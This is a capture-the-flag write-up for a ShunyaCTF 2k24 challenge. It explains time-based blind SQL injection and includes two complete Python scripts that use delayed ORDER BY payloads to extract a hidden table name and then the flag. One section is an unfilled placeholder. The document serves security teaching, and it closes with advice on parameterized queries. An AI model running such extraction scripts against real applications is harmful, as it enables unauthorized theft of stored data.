---
categories: [ShunyaCTF]
tags: [web exploitation, SQL injection]     # TAG names should always be lowercase
author: Darshan
description: Web exploitation category challenge created by me for ShunyaCTF 2k24
image:
    path: /assets/img/Banners/the-time-stone.jpg
pin: False
---

# Solution for Time-Based SQL Injection

## Challenge Overview

In this challenge, we exploited a time-based SQL injection vulnerability to extract the name of a dynamically generated table and retrieve the secret value stored within it. The challenge demonstrates the importance of secure coding practices and validates the effectiveness of SQL injection as an attack vector when inputs are not properly sanitized.

## Vulnerability Explained

Time-based SQL injection occurs when an attacker can influence the execution time of a database query to infer data. This type of injection is useful when direct data retrieval is not possible, but the application’s behavior can be observed based on the time it takes to execute certain queries.

The vulnerability in this challenge allowed attackers to:
1. Identify the name of a table with a specific prefix (`secret_`).
2. Extract the content of a column (in this case, the `text` column containing the secret flag) from the identified table.

The exploitation relied on crafting SQL queries that deliberately caused a delay (using a hypothetical `zhopi()` function) when a specific condition was met. By measuring the response time, the attacker could deduce whether the condition was true or false, thus extracting data character by character.

## Application Walkthrough

*(Leave it empty, I'll fill the details)*

## Solution Script Walkthrough

### 1. Finding the Table Name

The first part of the solution involved finding the dynamically generated table name. The `sqlite_master` table was queried to locate tables with names starting with `secret`. By leveraging the `SUBSTR` function, each character of the table name was extracted iteratively.

```python
# Script to find the table name
import requests
import base64
import json
import time

url = '<url for the chall>'

secret = list()
table_name = 'secret'
chars = 'abcdefghijklmnopqrstuvwxyz_'
sleep_time = 1

while True:
    found = False
    for i in chars:
        payload = f"(CASE WHEN (SELECT SUBSTR(name,{len(table_name)+1},1) FROM sqlite_master WHERE type='table' AND name LIKE 'secret%')='{i}' THEN id + zhopi({sleep_time}) ELSE rating END) DESC"

        encoded_payload = base64.b64encode(payload.encode()).decode('utf-8')

        data = {
            'sequence': encoded_payload
        }
        start_time = time.time()
        r = requests.post(
            url + '/api/movies',
            data=json.dumps(data),
            headers={'Content-Type': 'application/json'}
        )
        end_time = time.time()

        elapsed_time = end_time - start_time

        if elapsed_time >= sleep_time:
            table_name += i
            found = True
            print(f"Found character: {i}, updated table name: {table_name}")
            break
        else:
            print(f"\rTrying for: {i} at index: {len(table_name)}, elapsed time: {elapsed_time}", end="")

    if not found:
        print("No matching character found.")
        break

print(f"Final table name: {table_name}")
```

### 2. Extracting the Secret Value

After identifying the table name, the second script was used to extract the secret value. Similar logic was applied, but this time, the `text` column of the identified table was queried.

```python
# Script to find the value from the table
import requests
import base64
import json
import time

url = '<url for the chall>'

flag = ''
chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
sleep_time = 1

while True:
    found = False
    for i in chars:
        payload = f"(CASE WHEN (SELECT SUBSTR(text,{len(flag)+1},1) FROM secret_oezxsbhh_text WHERE id=1)='{i}' THEN id + zhopi({sleep_time}) ELSE rating END) DESC"

        encoded_payload = base64.b64encode(payload.encode()).decode('utf-8')

        data = {
            'sequence': encoded_payload
        }
        start_time = time.time()
        r = requests.post(
            url + '/api/movies',
            data=json.dumps(data),
            headers={'Content-Type': 'application/json'}
        )
        end_time = time.time()

        elapsed_time = end_time - start_time

        if elapsed_time >= sleep_time:
            flag += i
            found = True
            print(f"\nFound character: {i}, updated flag: {flag}")
            break
        else:
            print(f"\rTrying for: {i} at index: {len(flag)}, elapsed time: {elapsed_time}", end="")

    if not found:
        print("\nNo matching character found.")
        break

print(f"\nFinal flag: {flag}")
```

## How to Use the Solution Script

1. Update the `url` variable with the challenge URL.
2. Run the first script to find the table name.
   - Ensure the server is running and accessible.
   - The script will output the discovered table name.
3. Update the second script with the identified table name.
   - Replace `secret_oezxsbhh_text` with the discovered table name.
4. Run the second script to extract the secret value (flag).
   - The script will iteratively reveal the flag character by character.

## Conclusion

This challenge highlighted the importance of mitigating SQL injection vulnerabilities by:
- Validating and sanitizing user inputs.
- Using parameterized queries to prevent attackers from injecting malicious SQL.
- Disabling potentially harmful database functions or queries.

Understanding and exploiting time-based SQL injection requires patience and precision, making it an effective learning exercise for aspiring security professionals.

